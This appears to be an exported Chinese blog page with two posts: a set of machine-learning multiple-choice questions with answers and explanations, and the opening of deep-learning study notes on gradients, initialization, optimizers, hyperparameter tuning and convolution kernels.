6、下面哪个选项中哪一项属于确定性算法？A PCAB K-MeansC 以上都不是 答案：A解析：确定性算法表明在不同运行中，算法输出并不会改变。如果我们再一次运行算法，PCA 会得出相同的结果，而 k-means 不会。PCA没有需要调试的参数，Kmeans之所以每次的结果不同，因为初始化的点是随机的 7、两个变量的 Pearson 相关性系数为零，但这两个变量的值同样可以相关。这句描述是正确还是错误？A 正确B 错误 答案：A解析：Pearson相关系数只能衡量线性相关性，但无法衡量非线性关系。如y=x^2，x和y有很强的非线性关系。 5、下列属于无监督学习的是A k-meansB SVMC 最大熵D CRF 答案：A解析：A是聚类，属于无监督学习。BC是分类，属于监督学习。至于D是序列化标注，也是有监督学习。 1、在一个n维的空间中， 最好的检测outlier(离群点)的方法是（）A 作正态分布概率图B 作盒形图C 马氏距离D 作散点图 5、对于k折交叉验证, 以下对k的说法正确的是（）A k越大, 不一定越好, 选择大的k会加大评估时间B 选择更大的k, 就会有更小的bias偏差(因为训练集更加接近总数据集)C 在选择k时, 要最小化数据集之间的方差D 以上所有 答案：D解析：k越大, bias越小, 训练时间越长. 在训练时, 也要考虑数据集间方差差别不大的原则. 比如, 对于二类分类问题, 使用2-折交叉验证, 如果测试集里的数据都是A类的, 而训练集中数据都是B类的, 显然, 测试效果会很差.高方差，表名数据扰动所造成的影响大，没有排除噪音影响，过拟合高偏差，说明学习能力弱，不能很好的分类或者回归，欠拟合 7、模型的高bias是什么意思, 我们如何降低它 ？A 在特征空间中减少特征B 在特征空间中增加特征C 增加数据点D B和CE 以上所有 答案：B解析：bias太高说明模型太简单了, 数据维数不够, 无法准确预测数据, 所以, 升维吧 ! 2、“点击率问题”是这样一个预测问题, 99%的人是不会点击的, 而1%的人是会点击进去的, 所以这是一个非常不平衡的数据集. 假设, 现在我们已经建了一个模型来分类, 而且有了99%的预测准确率, 我们可以下的结论是A 模型预测准确率已经很高了, 我们不需要做什么了B 模型预测准确率不高, 我们需要做点什么改进模型C 无法下结论D 以上都不对 答案： B解析：99%的预测准确率可能说明, 你预测的没有点进去的人很准确 (因为有99%的人是不会点进去的, 这很好预测). 不能说明你的模型对点进去的人预测准确, 所以, 对于这样的非平衡数据集, 我们要把注意力放在小部分的数据上, 即那些点击进去的人.详细可以参考这篇文章：https://www.analyticsvidhya.com/blog/2016/03/practical-guide-deal-imbalanced-classification-problems/ 6、（假设precision=TP/(TP+FP),recall=TP/(TP+FN)。）在二分类问题中，当测试集的正例和负例数量不均衡时，以下评价方案哪个是相对不合理的（）A Accuracy:(TP+TN)/allB F-value:2recallprecision/(recall+precision)C G-mean:sqrt(precision*recall)D AUC:曲线下面积 答案：A解析：题目提到测试集正例和负例数量不均衡，那么假设正例数量很少占10%，负例数量占大部分90%。而且算法能正确识别所有负例，但正例只有一半能正确判别。那么TP=0.05×all,TN=0.9×all，Accuracy=95%。虽然Accuracy很高，precision是100%,但正例recall只有50% 7、以下哪些算法, 可以用神经网络去构造: KNN 线性回归 对数几率回归A 1和 2B 2 和 3C 1, 2 和 3D 以上都不是 答案： B解析： KNN算法不需要训练参数, 而所有神经网络都需要训练参数, 因此神经网络帮不上忙 最简单的神经网络, 感知器, 其实就是线性回归的训练 我们可以用一层的神经网络构造对数几率回归 6、在有监督学习中， 我们如何使用聚类方法？ 我们可以先创建聚类类别， 然后在每个类别上用监督学习分别进行学习 我们可以使用聚类“类别id”作为一个新的特征项， 然后再用监督学习分别进行学习 在进行监督学习之前， 我们不能新建聚类类别 我们不可以使用聚类“类别id”作为一个新的特征项， 然后再用监督学习分别进行学习A 2 和 4B 1 和 2C 3 和 4D 1 和 3 答案：B解析：我们可以为每个聚类构建不同的模型， 提高预测准确率。“类别id”作为一个特征项去训练， 可以有效地总结了数据特征。 7、以下说法正确的是 一个机器学习模型，如果有较高准确率，总是说明这个分类器是好的 如果增加模型复杂度， 那么模型的测试错误率总是会降低 如果增加模型复杂度， 那么模型的训练错误率总是会降低 我们不可以使用聚类“类别id”作为一个新的特征项， 然后再用监督学习分别进行学习A 1B 2C 3D 1 and 3 答案：C解析：1的模型中, 如果负样本占比非常大,也会有很高的准确率, 对正样本的分类不一定很好;2,3的模型中, 增加复杂度则对训练集, 而不是测试集, 有过拟合, 所以训练错误率总会降低;4的模型中, “类别id”可以作为一个特征项去训练, 这样会有效地总结了数据特征。 8、对应GradientBoosting tree算法， 以下说法正确的是: 当增加最小样本分裂个数，我们可以抵制过拟合 当增加最小样本分裂个数，会导致过拟合 当我们减少训练单个学习器的样本个数，我们可以降低variance 当我们减少训练单个学习器的样本个数，我们可以降低biasA 2 和 4B 2 和 3C 1 和 3D 1 和 4 答案：C解析：最小样本分裂个数是用来控制“过拟合”参数。太高的值会导致“欠拟合”，这个参数应该用交叉验证来调节。第二点是靠bias和variance概念的。 10、如果一个训练好的模型在测试集上有100%的准确率， 这是不是意味着在一个新的数据集上，也会有同样好的表现？A 是的，这说明这个模型的范化能力已经足以支持新的数据集合了B 不对，依然后其他因素模型没有考虑到，比如噪音数据 答案：B解析：没有一个模型是可以总是适应新数据的。我们不可能可到100%准确率。 2、变量选择是用来选择最好的判别器子集， 如果要考虑模型效率，我们应该做哪些变量选择的考虑？ 多个变量其实有相同的用处 变量对于模型的解释有多大作用 特征携带的信息 交叉验证A 1 和 4B 1, 2 和 3C 1,3 和 4D 以上所有 答案：C解析：注意， 这题的题眼是考虑模型效率，所以不要考虑选项2. 4、对于下面三个模型的训练情况， 下面说法正确的是: 第一张图的训练错误与其余两张图相比，是最大的 最后一张图的训练效果最好，因为训练错误最小 第二张图比第一和第三张图鲁棒性更强，是三个里面表现最好的模型 第三张图相对前两张图过拟合了 三个图表现一样，因为我们还没有测试数据集A 1 和 3B 1 和 3C 1, 3 和 4D 5 答案：C解析：最后一张过拟合, 训练错误最小, 第一张相反, 训练错误就是最大了. 所以1是对的;仅仅训练错误最小往往说明过拟合, 所以2错, 4对;第二张图平衡了拟合和过拟合, 所以3对; 9、下面哪个/些选项对 K 折交叉验证的描述是正确的？1.增大 K 将导致交叉验证结果时需要更多的时间2.更大的 K 值相比于小 K 值将对交叉验证结构有更高的信心3.如果 K=N，那么其称为留一交叉验证，其中 N 为验证集中的样本数量A 1 和 2B 2 和 3C 1 和 3D 1、2 和 3 答案：D解析：大 K 值意味着对过高估计真实预期误差（训练的折数将更接近于整个验证集样本数）拥有更小的偏差和更多的运行时间（并随着越来越接近极限情况：留一交叉验证）。我们同样在选择 K 值时需要考虑 K 折准确度和方差间的均衡。 1、给定三个变量 X，Y，Z。(X, Y)、(Y, Z) 和 (X, Z) 的 Pearson 相关性系数分别为 C1、C2 和 C3。现在 X 的所有值加 2（即 X+2），Y 的全部值减 2（即 Y-2），Z 保持不变。那么运算之后的 (X, Y)、(Y, Z) 和 (X, Z) 相关性系数分别为 D1、D2 和 D3。现在试问 D1、D2、D3 和 C1、C2、C3 之间的关系是什么？A D1= C1, D2 &lt; C2, D3 &gt; C3B D1 = C1, D2 &gt; C2, D3 &gt; C3C D1 = C1, D2 &gt; C2, D3 &lt; C3D D1 = C1, D2 &lt; C2, D3 &lt; C3E D1 = C1, D2 = C2, D3 = C3 答案：E解析：特征之间的相关性系数不会因为特征加或减去一个数而改变。 3、假设我们有一个数据集，在一个深度为 6 的决策树的帮助下，它可以使用 100% 的精确度被训练。现在考虑一下两点，并基于这两点选择正确的选项。注意：所有其他超参数是相同的，所有其他因子不受影响。1.深度为 4 时将有高偏差和低方差2.深度为 4 时将有低偏差和低方差A 只有 1B 只有 2C 1 和 2D 没有一个 答案：A解析：如果在这样的数据中你拟合深度为 4 的决策树，这意味着其更有可能与数据欠拟合。因此，在欠拟合的情况下，你将获得高偏差和低方差。 4、在以下不同的场景中,使用的分析方法不正确的有A 根据商家最近一年的经营及服务数据,用聚类算法判断出天猫商家在各自主营类目下所属的商家层级B 根据商家近几年的成交数据,用聚类算法拟合出用户未来一个月可能的消费金额公式C 用关联规则算法分析出购买了汽车坐垫的买家,是否适合推荐汽车脚垫D 根据用户最近购买的商品信息,用决策树算法识别出淘宝买家可能是男还是女 答案：B解析：预测消费更合适的算法是用回归模型来做。而不是聚类算法。 10、在大规模的语料中，挖掘词的相关性是一个重要的问题。以下哪一个信息不能用于确定两个词的相关性。A 互信息B 最大熵C 卡方检验D 最大似然比 答案：B解析：最大熵代表了整体分布的信息，通常具有最大熵的分布作为该随机变量的分布，不能体现两个词的相关性，但是卡方是检验两类事务发生的相关性。所以选B【正解】 1、基于统计的分词方法为（）A 正向最大匹配法B 逆向最大匹配法C 最少切分D 条件随机场 答案：D解析：第一类是基于语法和规则的分词法。其基本思想就是在分词的同时进行句法、语义分析,利用句法信息和语义信息来进行词性标注,以解决分词歧义现象。因为现有的语法知识、句法规则十分笼统、复杂,基于语法和规则的分词法所能达到的精确度远远还不能令人满意,目前这种分词系统还处在试验阶段。 第二类是机械式分词法（即基于词典）。机械分词的原理是将文档中的字符串与词典中的词条进行逐一匹配,如果词典中找到某个字符串,则匹配成功,可以切分,否则不予切分。基于词典的机械分词法,实现简单,实用性强,但机械分词法的最大的缺点就是词典的完备性不能得到保证。据统计,用一个含有70000个词的词典去切分含有15000个词的语料库,仍然有30%以上的词条没有被分出来,也就是说有4500个词没有在词典中登录。 第三类是基于统计的方法。基于统计的分词法的基本原理是根据字符串在语料库中出现的统计频率来决定其是否构成词。词是字的组合,相邻的字同时出现的次数越多,就越有可能构成一个词。因此字与字相邻共现的频率或概率能够较好的反映它们成为词的可信度。 2、在下面的图像中，哪一个是多元共线（multi-collinear）特征？A 图 1 中的特征B 图 2 中的特征C 图 3 中的特征D 图 1、2 中的特征E 图 2、3 中的特征F 图 1、3 中的特征 答案：D解析：在图 1 中，特征之间有高度正相关，图 2 中特征有高度负相关。所以这两个图的特征是多元共线特征。 陌生的知识点6、关于 ARMA 、 AR 、 MA 模型的功率谱，下列说法正确的是（ ）A MA模型是同一个全通滤波器产生的B MA模型在极点接近单位圆时，MA谱是一个深谷C AR模型在零点接近单位圆时，AR谱是一个尖峰D RMA谱既有尖峰又有深谷 答案：D 4、下列哪个不属于CRF(conditional random field algorithm条件随机场算法)模型对于HMM和MEMM模型的优势A 特征灵活B 速度快C 可容纳较多上下文信息D 全局最优 答案：B解析：HMM模型是对转移概率和表现概率直接建模，统计共现概率。而MEMM模型是对转移概率和表现概率建立联合概率，统计时统计的是条件概率。CRF是在给定需要标记的观察序列的条件下，计算整个标记序列的联合概率分布，而不是在给定当前状态条件下，定义下一个状态的状态分布。MEMM容易陷入局部最优，是因为MEMM只在局部做归一化。CRF模型中，统计了全局概率，在做归一化时，考虑了数据在全局的分布，而不是仅仅在局部归一化，这样就解决了MEMM中的标记偏置的问题。 CRF没有HMM那样严格的独立性假设条件，因而可以容纳任意的上下文信息，特征设计灵活。CRF需要训练的参数更多，与MEMM和HMM相比，它存在训练代价大、复杂度高的缺点。 9、已知一组数据的协方差矩阵P,下面关于主分量说法错误的是（）A 主分量分析的最佳准则是对一组数据进行按一组正交基分解, 在只取相同数量分量的条件下,以均方误差计算截尾误差最小B 在经主分量分解后,协方差矩阵成为对角矩阵C 主分量分析就是K-L变换D 主分量是通过求协方差矩阵的特征值得到 答案：C解析：K-L变换与PCA变换是不同的概念，PCA的变换矩阵是协方差矩阵，K-L变换的变换矩阵可以有很多种（二阶矩阵、协方差矩阵、总类内离散度矩阵等等）。当K-L变换矩阵为协方差矩阵时，等同于PCA。 8、位势函数法的积累势函数K(x)的作用相当于Bayes判决中的()A 后验概率B 先验概率C 类概率密度D 类概率密度与先验概率的和 答案：A解析：具体的，势函数详解请看——《势函数法》。 7、以下哪个是常见的时间序列算法模型A RSIB MACDC ARMAD KDJ 答案：C解析：自回归滑动平均模型(ARMA)其建模思想可概括为：逐渐增加模型的阶数，拟合较高阶模型，直到再增加模型的阶数而剩余残差方差不再显著减小为止。 其他三项都不是一个层次的。A.相对强弱指数 (RSI, Relative Strength Index) 是通过比较一段时期内的平均收盘涨数和平均收盘跌数来分析市场买沽盘的意向和实力 , 从而作出未来市场的走势 .B.移动平均聚散指标 (MACD, Moving Average Convergence Divergence), 是根据均线的构造原理 , 对股票价格的收盘价进行平滑处理 , 求出算术平均值以后再进行计算 , 是一种趋向类指标 .D. 随机指标 (KDJ) 一般是根据统计学的原理 , 通过一个特定的周期 ( 常为 9 日 ,9 周等 ) 内出现过的最高价 , 最低价及最后一个计算周期的收盘价及这三者之间的比例关系 , 来计算最后一个计算周期的未成熟随机值 RSV, 然后根据平滑移动平均线的方法来计算 K 值 , D 值与 J 值 , 并绘成曲线图来研判股票走势 . 1、下列时间序列模型中,哪一个模型可以较好地拟合波动性的分析和预测。A AR模型B MA模型C ARMA模型D GARCH模型 答案：D解析：AR模型是一种线性预测，即已知N个数据，可由模型推出第N点前面或后面的数据（设推出P点），所以其本质类似于插值。MA模型(moving average model)滑动平均模型，其中使用趋势移动平均法建立直线趋势的预测模型。ARMA模型(auto regressive moving average model)自回归滑动平均模型，模型参量法高分辨率谱分析方法之一。这种方法是研究平稳随机过程有理谱的典型方法。它比AR模型法与MA模型法有较精确的谱估计及较优良的谱分辨率性能，但其参数估算比较繁琐。GARCH模型称为广义ARCH模型，是ARCH模型的拓展，由Bollerslev(1986)发展起来的。它是ARCH模型的推广。GARCH(p,0)模型，相当于ARCH(p)模型。GARCH模型是一个专门针对金融数据所量体订做的回归模型，除去和普通回归模型相同的之处，GARCH对误差的方差进行了进一步的建模。特别适用于波动性的分析和预测，这样的分析对投资者的决策能起到非常重要的指导性作用，其意义很多时候超过了对数值本身的分析和预测。 2、Fisher线性判别函数的求解过程是将M维特征矢量投影在（ ）中进行求解。A M-1维空间B 一维空间C 三维空间D 二维空间 答案：B解析：Fisher线性判别函数是将多维空间中的特征矢量投影到一条直线上，也就是把维数压缩到一维。寻找这条最优直线的准则是Fisher准则：两类样本在一维空间的投影满足类内尽可能密集，类间尽可能分开，也就是投影后两类样本均值之差尽可能大，类内部方差尽可能小。一般而言，对于数据分布近似高斯分布的情况，Fisher线性判别准则能够得到很好的分类效果。 3、类域界面方程法中，不能求线性不可分情况下分类问题近似或精确解的方法是（ ）A 势函数法B 基于二次准则的H-K算法C 伪逆法D 感知器算法 答案：D解析：线性分类器的设计就是利用训练样本集建立线性判别函数式，也就是寻找最优的权向量的过程。求解权重的过程就是训练过程，训练方法的共同点是，先给出准则函数，再寻找是准则函数趋于极值的优化方法。ABC方法都可以得到线性不可分情况下分类问题近似解。感知器可以解决线性可分的问题，但当样本线性不可分时，感知器算法不会收敛。","link":"/2017/10/18/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E9%80%89%E6%8B%A9%E9%A2%98%E9%9B%86%E9%94%A6/"},{"title":"深度学习笔记","text":"置顶 人工智能、机器学习和深度学习的关系 深度学习与传统机器学习的数据划分区别 请简要介绍下tensorflow的计算图 name_scope 和 variable_scope的区别 什麽样的资料集不适合用深度学习 偏差方差及其应对方法 神经网络隐层维度规则 损失函数和成本函数 什么是激活函数，为什么要用非线性激活函数 神经网络里的正则化为什么能防止过拟合 ReLu为什么要好过于tanh和sigmoid Sigmoid、Tanh、ReLu有什么优缺点，有没改进的激活函数 简单说下sigmoid激活函数 神经网络中激活函数的真正意义？一个激活函数需要具有哪些必要的属性？还有哪些属性是好的属性但不必要的 什么是梯度消失和梯度爆炸，分别会引发什么问题 如何确定是否出现梯度爆炸 如何利用初始化缓解梯度消失和爆炸 如何解决梯度消失和梯度膨胀 如何解决RNN梯度爆炸和弥散的问题 神经网络初始化权重为什么不能初始化为0 常见的学习率衰减方法 局部最优问题（鞍点） 神经网络的优化算法 参数和超参数 超参数调试处理 deep learning（rnn、cnn）调参经验 怎么加快训练的速度 机器学习开发策略 卷积神经网络示例 卷积操作详解（填充、步长、高维卷积、卷积公式） 为什么使用卷积 为什么要使用许多小卷积核如3x3,而不是几个大卷积核？ 为什么我们对图像使用卷积而不仅仅只使用FC层？ 卷积网络怎么进行边缘检测 CNN的卷积核是单层的还是多层的 池化层简介 池化层的作用 池化为什么对平移不变性有贡献 SPP空间金字塔池化 全连接层的作用 dropout随机失活 Batch Normalization CNN经典网络对比 CNN经典网络总结 RNN GRU LSTM Tensorflow 官网推荐的一篇伟大文章，特别介绍递归神经网络和LSTM GRU与LSTM的区别 LSTM结构推导，为什么比RNN好 为什么LSTM模型中既存在sigmoid又存在tanh两种激活函数 RNN是怎么从单层网络一步一步构造的 seq2seq序列模型 attention注意力模型 语言识别 触发词检测 什么是感知器 什么是端到端的网络 上采样和下采样 CNN最成功的应用是在CV，那为什么NLP和Speech的很多问题也可以用CNN解出来？为什么AlphaGo里也用了CNN？这几个不相关的问题的相似性在哪里？CNN通过什么手段抓住了这个共性？ 为什么很多做人脸的Paper会最后加入一个Local Connected Conv 广义线性模型是怎被应用在深度学习中 Dilated Convolution空洞卷积/扩张卷积/膨胀卷积 神经网络发展历史 文本数据抽取 Word2Vec Word2vec之Skip-Gram模型 迁移学习 目标检测_吴恩达 目标检测_RCNN系列 人脸识别 神经风格转移 生成对抗网络 命名实体识别 人工智能、机器学习和深度学习的关系深度学习是基于传统的神经网络算法发展到多隐层的一种算法体现。 什么是梯度消失和梯度爆炸，分别会引发什么问题我们知道神经网络在训练过程中会利用梯度对网络的权重进行更新迭代。当梯度出现指数级递减或指数递增时，称为梯度消失或者梯度爆炸。 假定激活函数 $g(z) = z$, 令 $b^{[l]} = 0$，对于目标输出有：$\\hat{y} = W^{[L]}W^{[L-1]}…W^{[2]}W^{[1]}X$1）对于 W[l]的值小于 1 的情况，激活函数的值将以指数级递减2）对于 W[l]的值大于 1 的情况，激活函数的值将以指数级递增同理的情况会出现在反向求导。 梯度消失时，权重更新缓慢，训练难度大大增加。梯度消失相对梯度爆炸更常见。梯度爆炸时，权重大幅更新，网络变得不稳定。较好的情况是网络无法利用训练数据学习，最差的情况是权值增大溢出，变成网络无法更新的 NaN 值。 如何利用初始化缓解梯度消失和爆炸根据 z=w1x1+w2x2+…+wnxn+b可知，当输入的数量 n 较大时，我们希望每个 wi 的值都小一些，这样它们的和得到的 z 也较小。为了得到较小的 wi，设置Var(wi)=1/n，这里称为 Xavier initialization。 WL = np.random.randn(WL.shape[0], WL.shape[1]) * np.sqrt(1/n) 其中 n 是输入的神经元个数，即WL.shape[1]。这样，激活函数的输入 x 近似设置成均值为 0，标准方差为 1，神经元输出 z 的方差就正则化到 1 了。虽然没有解决梯度消失和爆炸的问题，但其在一定程度上确实减缓了梯度消失和爆炸的速度。 同理，也有 He Initialization。它和 Xavier initialization 唯一的区别是Var(wi)=2/n，适用于 ReLU 作为激活函数时。当激活函数使用 ReLU 时，Var(wi)=2/n；当激活函数使用 tanh 时，Var(wi)=1/n。 如何确定是否出现梯度爆炸信号如下： 训练过程中，每个节点和层的误差梯度值持续超过1.0。 模型不稳定，梯度显著变化，快速变大。 训练过程中，模型权重变成 NaN 值。 模型无法从训练数据中获得更新。 如何解决梯度消失和梯度膨胀梯度消失和梯度爆炸都可以通过激活函数或Batch Normalization来解决。吴恩达：BN有效原因 对于梯度爆炸，这里列举一些最佳实验方法： 重新设计网络模型在深度神经网络中，梯度爆炸可以通过重新设计层数更少的网络来解决。使用更小的批尺寸对网络训练也有好处。在循环神经网络中，训练过程中在更少的先前时间步上进行更新（沿时间的截断反向传播，truncated Backpropagation through time）可以缓解梯度爆炸问题。 使用 ReLU 激活函数在深度多层感知机神经网络中，梯度爆炸的发生可能是因为激活函数，如之前很流行的 Sigmoid 和 Tanh 函数。使用 ReLU 激活函数可以减少梯度爆炸。采用 ReLU 激活函数是最适合隐藏层的新实践。 使用长短期记忆网络在循环神经网络中，梯度爆炸的发生可能是因为某种网络的训练本身就存在不稳定性，如随时间的反向传播本质上将循环网络转换成深度多层感知机神经网络。使用长短期记忆（LSTM）单元和相关的门类型神经元结构可以减少梯度爆炸问题。采用 LSTM 单元是适合循环神经网络的序列预测的最新最好实践。 使用梯度截断（Gradient Clipping）在非常深且批尺寸较大的多层感知机网络和输入序列较长的 LSTM 中，仍然有可能出现梯度爆炸。如果梯度爆炸仍然出现，你可以在训练过程中检查和限制梯度的大小。这就是梯度截断。处理梯度爆炸有一个简单有效的解决方案：如果梯度超过阈值，就截断它们。——《Neural Network Methods in Natural Language Processing》，2017.具体来说，检查误差梯度的值是否超过阈值，如果超过，则截断梯度，将梯度设置为阈值。梯度截断可以一定程度上缓解梯度爆炸问题（梯度截断，即在执行梯度下降步骤之前将梯度设置为阈值）。 ——《深度学习》，2016.在 Keras 深度学习库中，你可以在训练之前设置优化器上的 clipnorm 或 clipvalue 参数，来使用梯度截断。默认值为 clipnorm=1.0 、clipvalue=0.5。详见：https://keras.io/optimizers/。 使用权重正则化（Weight Regularization）如果梯度爆炸仍然存在，可以尝试另一种方法，即检查网络权重的大小，并惩罚产生较大权重值的损失函数。该过程被称为权重正则化，通常使用的是 L1 惩罚项（权重绝对值）或 L2 惩罚项（权重平方）。对循环权重使用 L1 或 L2 惩罚项有助于缓解梯度爆炸。——On the difficulty of training recurrent neural networks，2013.在 Keras 深度学习库中，你可以通过在层上设置 kernel_regularizer 参数和使用 L1 或 L2 正则化项进行权重正则化。 如何解决RNN梯度爆炸和弥散的问题梯度爆炸：当梯度大于一定阈值的的时候，将它截断为一个较小的数。下图可视化了梯度截断的效果。它展示了一个小的rnn（其中W为权值矩阵，b为bias项）的决策面。这个模型是一个一小段时间的rnn单元组成；实心箭头表明每步梯度下降的训练过程。当梯度下降过程中，模型的目标函数取得了较高的误差时，梯度将被送到远离决策面的位置。截断模型产生了一个虚线，它将误差梯度拉回到离原始梯度接近的位置。 梯度弥散：第一种方法是将随机初始化改为一个有关联的矩阵初始化。第二种方法是使用ReLU代替sigmoid函数。ReLU的导数不是0就是1.因此，神经元的梯度将始终为1，而不会当梯度传播了一定时间之后变小。 基本的 RNN 不擅长捕获这种长期依赖关系， LSTM 和 GRU 都可以作为缓解梯度消失问题的方案。 神经网络初始化权重为什么不能初始化为0将所有权重初始化为零将无法破坏网络的对称性。这意味着每一层的每个神经元都会学到相同的东西，这样的神经元网络并不比线性分类器如逻辑回归更强大。 需要注意的是，需要初始化去破坏网络对称性(symmetry)的只有W，b可以全部初始化为0。 常见的学习率衰减方法如果设置一个固定的学习率 α，在最小值点附近，由于不同的 batch 中存在一定的噪声，因此不会精确收敛，而是始终在最小值周围一个较大的范围内波动。 而如果随着时间慢慢减少学习率 α 的大小，在初期 α 较大时，下降的步长较大，能以较快的速度进行梯度下降；而后期逐步减小 α 的值，即减小步长，有助于算法的收敛，更容易接近最优解。 最常用的学习率衰减方法：$\\alpha = \\frac{1}{1 + decay\\_rate * epoch\\_num} * \\alpha_0$其中，decay_rate为衰减率（超参数），epoch_num为将所有的训练样本完整过一遍的次数。 指数衰减：$\\alpha = 0.95^{epoch\\_num} * \\alpha_0$ 其他：$\\alpha = \\frac{k}{\\sqrt{epoch\\_num}} * \\alpha_0$ 离散下降对于较小的模型，也有人会在训练时根据进度手动调小学习率。 局部最优问题（鞍点）鞍点（saddle）是函数上的导数为零，但不是轴上局部极值的点。当我们建立一个神经网络时，通常梯度为零的点是上图所示的鞍点，而非局部最小值。 减少损失的难度也来自误差曲面中的鞍点，而不是局部最低点。因为在一个具有高维度空间的成本函数中，如果梯度为 0，那么在每个方向，成本函数或是凸函数，或是凹函数。而所有维度均需要是凹函数的概率极小，因此在低维度的局部最优点的情况并不适用于高维度。 结论：（1）在训练较大的神经网络、存在大量参数，并且成本函数被定义在较高的维度空间时，困在极差的局部最优中是不大可能的；（2）鞍点附近的平稳段会使得学习非常缓慢，而这也是动量梯度下降法、RMSProp 以及 Adam 优化算法能够加速学习的原因，它们能帮助尽早走出平稳段。 神经网络的优化算法吴恩达优化算法章节总结链接：http://kyonhuang.top/Andrew-Ng-Deep-Learning-notes/#/Improving_Deep_Neural_Networks/优化算法 深度学习难以在大数据领域发挥最大效果的一个原因是，在巨大的数据集基础上进行训练速度很慢。而优化算法能够帮助快速训练模型，大大提高效率。 常见优化算法：1、batch 梯度下降法，同时处理整个训练集2、Mini-Batch 梯度下降法（1）mini-batch 的大小为 1，即是随机梯度下降法（stochastic gradient descent），每个样本都是独立的 mini-batch（2）mini-batch 的大小为 m（数据集大小），即是 batch 梯度下降法（3）batch 的不同大小（size）带来的影响 batch 梯度下降法： 对所有 m 个训练样本执行一次梯度下降，每一次迭代时间较长，训练过程慢； 相对噪声低一些，幅度也大一些； 成本函数总是向减小的方向下降。 随机梯度下降法： 对每一个训练样本执行一次梯度下降，训练速度快，但丢失了向量化带来的计算加速； 有很多噪声，减小学习率可以适当； 成本函数总体趋势向全局最小值靠近，但永远不会收敛，而是一直在最小值附近波动。因此，选择一个1 &lt; size &lt; m的合适的大小进行 Mini-batch 梯度下降，可以实现快速学习，也应用了向量化带来的好处，且成本函数的下降处于前两者之间。 （4）mini-batch 大小的选择 如果训练样本的大小比较小，如 m ⩽ 2000 时，选择 batch 梯度下降法； 如果训练样本的大小比较大，选择 Mini-Batch 梯度下降法。为了和计算机的信息存储方式相适应，代码在 mini-batch 大小为 2 的幂次时运行要快一些。典型的大小为 26、27、…、29； mini-batch 的大小要符合 CPU/GPU 内存。mini-batch 的大小也是一个重要的超变量，需要根据经验快速尝试，找到能够最有效地减少成本函数的值。 3、了解加权平均4、动量梯度下降法，是计算梯度的指数加权平均数，并利用该值来更新参数值5、RMSProp算法，是在对梯度进行指数加权平均的基础上，引入平方和平方根6、Adam优化算法（Adaptive Moment Estimation，自适应矩估计），基本上就是将 Momentum 和 RMSProp 算法结合在一起，通常有超越二者单独时的效果 参数和超参数参数即是我们在过程中想要模型学习到的信息（模型自己能计算出来的），例如 $W^{[l]}$，$b^{[l]}$。而超参数（hyper parameters）即为控制参数的输出值的一些网络信息（需要人经验判断）。超参数的改变会导致最终得到的参数 $W^{[l]}$，$b^{[l]}$ 的改变。 典型的超参数有：（1）学习速率：α（2）迭代次数：N（3）隐藏层的层数：L（4）每一层的神经元个数：$n^{[1]}$，$n^{[2]}$，…（5）激活函数 g(z) 的选择 当开发新应用时，预先很难准确知道超参数的最优值应该是什么。因此，通常需要尝试很多不同的值。应用深度学习领域是一个很大程度基于经验的过程。 比如常见的梯度下降问题，好的超参数能使你尽快收敛： 超参数调试处理重要程度排序目前已经讲到过的超参数中，重要程度依次是（仅供参考）： 最重要： 学习率 α； 其次重要： β：动量衰减参数，常设置为 0.9； hidden units：各隐藏层神经元个数； mini-batch 的大小； 再次重要： β1，β2，ϵ：Adam 优化算法的超参数，常设为 0.9、0.999、$10^{-8}$； layers：神经网络层数; decay_rate：学习衰减率； 调参技巧系统地组织超参调试过程的技巧： 随机选择点（而非均匀选取），用这些点实验超参数的效果。这样做的原因是我们提前很难知道超参数的重要程度，可以通过选择更多值来进行更多实验； 由粗糙到精细：聚焦效果不错的点组成的小区域，在其中更密集地取值，以此类推； 选择合适的范围 对于学习率 α，用对数标尺而非线性轴更加合理：0.0001、0.001、0.01、0.1 等，然后在这些刻度之间再随机均匀取值； 对于 β，取 0.9 就相当于在 10 个值中计算平均值，而取 0.999 就相当于在 1000 个值中计算平均值。可以考虑给 1-β 取值，这样就和取学习率类似了。 上述操作的原因是当 β 接近 1 时，即使 β 只有微小的改变，所得结果的灵敏度会有较大的变化。例如，β 从 0.9 增加到 0.9005 对结果（1/(1-β)）几乎没有影响，而 β 从 0.999 到 0.9995 对结果的影响巨大（从 1000 个值中计算平均值变为 2000 个值中计算平均值）。 一些建议 深度学习如今已经应用到许多不同的领域。不同的应用出现相互交融的现象，某个应用领域的超参数设定有可能通用于另一领域。不同应用领域的人也应该更多地阅读其他研究领域的 paper，跨领域地寻找灵感； 考虑到数据的变化或者服务器的变更等因素，建议每隔几个月至少一次，重新测试或评估超参数，来获得实时的最佳模型； 根据你所拥有的计算资源来决定你训练模型的方式： Panda（熊猫方式）：在在线广告设置或者在计算机视觉应用领域有大量的数据，但受计算能力所限，同时试验大量模型比较困难。可以采用这种方式：试验一个或一小批模型，初始化，试着让其工作运转，观察它的表现，不断调整参数； Caviar（鱼子酱方式）：拥有足够的计算机去平行试验很多模型，尝试很多不同的超参数，选取效果最好的模型； CNN的卷积核是单层的还是多层的描述网络模型中某层的厚度，通常用名词 通道（channel）数或者 特征图（feature map）数。不过人们更习惯把作为数据输入的前层的厚度称之为通道数（比如RGB三色图层称为输入通道数为3），把作为卷积输出的后层的厚度称之为特征图数。 卷积核(filter)一般是3D多层的，除了面积参数, 比如3x3之外, 还有厚度参数H（2D的视为厚度1). 还有一个属性是卷积核的个数N。 卷积核的厚度H，一般等于前层厚度M(输入通道数或feature map数)。特殊情况M &gt; H。 卷积核的个数N，一般等于后层厚度(后层feature maps数，因为相等所以也用N表示)。 卷积核通常从属于后层，为后层提供了各种查看前层特征的视角，这个视角是自动形成的。 卷积核厚度等于1时为2D卷积，对应平面点相乘然后把结果加起来，相当于点积运算； 卷积核厚度大于1时为3D卷积，每片分别平面点求卷积，然后把每片结果加起来，作为3D卷积结果；1x1卷积属于3D卷积的一个特例，有厚度无面积，直接把每片单个点乘以权重再相加。 下面解释一下特殊情况的 M &gt; H：实际上，除了输入数据的通道数比较少之外，中间层的feature map数很多，这样中间层算卷积会累死计算机。所以很多深度卷积网络把全部通道/特征图划分一下，每个卷积核只看其中一部分。这样整个深度网络架构是横向开始分道扬镳了，到最后才又融合。这样看来，很多网络模型的架构不完全是突发奇想，而是是被参数计算量逼得。特别是现在需要在移动设备上进行AI应用计算(也叫推断), 模型参数规模必须更小, 所以出现很多减少握手规模的卷积形式, 现在主流网络架构大都如此。 卷积神经网络示例 随着神经网络计算深度不断加深，图片的高度和宽度 n[l]H、n[l]W一般逐渐减小，而 n[l]c在增加。 